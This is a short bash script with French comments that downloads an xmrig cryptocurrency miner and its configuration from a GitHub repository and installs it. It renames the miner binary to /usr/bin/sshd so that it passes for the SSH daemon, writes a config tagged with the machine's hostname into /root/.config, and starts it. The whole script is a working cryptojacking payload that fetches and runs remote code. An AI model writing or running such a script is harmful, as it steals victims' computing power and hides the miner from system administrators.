#!/bin/bash

#le nom
nom=$(cat /etc/hostname | head -1)

#espace de travail
mkdir /tmp/mx

#wget le miner
wget "https://github.com/Hackme258/Sshd/raw/main/xmrig.tgz"

#decompresse
mv xmrig.tgz /tmp/mx/xmrig.tgz
tar -zxvf xmrig.tgz
mv /tmp/mx/minerd /usr/bin/sshd

#wget la config
wget "https://github.com/Hackme258/Sshd/raw/main/xmrig.json"
mkdir /root/.config
sed -i 's/nom_machine/$nom/g' xmrig.json
mv xmrig.json /root/.config/xmrig.json

#lancement
/usr/bin/sshd
